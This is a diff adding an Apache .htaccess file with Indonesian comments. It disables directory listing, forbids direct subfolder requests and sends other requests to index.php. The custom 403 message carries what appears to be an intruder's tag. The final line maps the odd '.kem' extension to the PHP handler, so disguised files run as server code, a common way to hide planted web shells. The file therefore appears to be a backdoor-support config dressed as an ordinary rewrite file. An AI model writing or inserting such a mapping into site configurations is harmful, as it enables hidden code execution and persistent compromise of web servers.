@@ -1,0 +1,30 @@
+# ========================
+# PESAN 403 CUSTOM
+# ========================
+ErrorDocument 403 "isc2k17's here_0x"
+
+# ========================
+# MATIKAN INDEXING
+# ========================
+Options -Indexes
+
+# ========================
+# REWRITE STANDARD
+# ========================
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+    RewriteBase /
+
+    # JANGAN 403 halaman root (/), tapi 403 kalau akses subfolder/ langsung
+    RewriteCond %{REQUEST_URI} /$
+    RewriteCond %{REQUEST_URI} !^/$
+    RewriteRule ^ - [F]
+
+    # Front controller
+    RewriteRule ^index\.php$ - [L]
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule . /index.php [L]
+</IfModule>
+
+AddType application/x-httpd-php .kem
